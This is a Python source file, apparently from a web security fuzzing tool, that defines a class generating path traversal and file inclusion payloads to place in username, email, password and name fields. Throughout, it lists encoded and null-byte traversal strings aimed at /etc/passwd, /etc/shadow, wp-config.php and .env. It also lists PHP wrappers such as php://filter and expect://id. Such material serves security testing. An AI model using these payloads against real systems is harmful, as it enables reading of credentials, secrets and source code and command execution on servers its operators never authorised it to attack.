from typing import Dict
import random

class PathGenerator:
    def __init__(self):
        self.basic_traversal = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "....//....//....//etc/passwd",
            "..././..././..././etc/passwd",
            "/../../../../../../etc/passwd"
        ]
        
        self.encoded_traversal = [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
        ]
        
        self.system_files = [
            "/etc/shadow",
            "/etc/master.passwd",
            "/windows/win.ini",
            "/boot.ini",
            "/system.ini"
        ]
        
        self.log_files = [
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/apache2/access.log",
            "/usr/local/apache/log/access_log",
            "/var/log/nginx/access.log"
        ]
        
        self.config_files = [
            "/etc/php.ini",
            "/etc/my.cnf",
            "/etc/httpd/conf/httpd.conf",
            "/usr/local/etc/php.ini",
            "/etc/nginx/nginx.conf"
        ]
        
        self.special_paths = [
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "expect://id",
            "data://text/plain;base64,SGVsbG8sIFdvcmxkIQ=="
        ]

    def generate_attack(self) -> Dict[str, str]:
        """Gera um ataque de traversal de diretório aleatório"""
        all_paths = (
            self.basic_traversal +
            self.encoded_traversal +
            self.system_files +
            self.log_files +
            self.config_files +
            self.special_paths
        )
        
        path = random.choice(all_paths)
        return {
            'username': path,
            'email': f"path@{path}.com",
            'password': path,
            'full_name': path
        }

    def generate_mixed_path(self) -> Dict[str, str]:
        """Gera caminhos com diferentes separadores"""
        base_paths = [
            "/etc/passwd",
            "/windows/system32/cmd.exe",
            "/var/www/html/index.php"
        ]
        
        separators = ['/', '\\', '//', '\\\\', '/./', '\\.\\']
        parts = random.choice(base_paths).split('/')
        
        mixed_path = random.choice(separators).join(parts)
        return {
            'username': mixed_path,
            'password': mixed_path
        }

    def generate_protocol_wrapper(self) -> Dict[str, str]:
        """Gera wrappers de protocolo maliciosos"""
        wrappers = [
            "php://filter/convert.base64-encode/resource=",
            "php://filter/read=convert.base64-encode/resource=",
            "php://input",
            "data://text/plain;base64,",
            "expect://"
        ]
        
        files = [
            "index.php",
            "config.php",
            "wp-config.php",
            "connection.php",
            ".env"
        ]
        
        wrapper = f"{random.choice(wrappers)}{random.choice(files)}"
        return {
            'username': wrapper,
            'password': wrapper
        }

    def generate_null_byte(self) -> Dict[str, str]:
        """Gera paths com null bytes para bypass"""
        paths = [
            "/etc/passwd%00.jpg",
            "/etc/shadow%00.png",
            "../../etc/passwd%00.gif",
            "../../../windows/win.ini%00.jpg",
            "/var/www/html/index.php%00.png"
        ]
        return {
            'username': random.choice(paths),
            'password': random.choice(paths)
        }
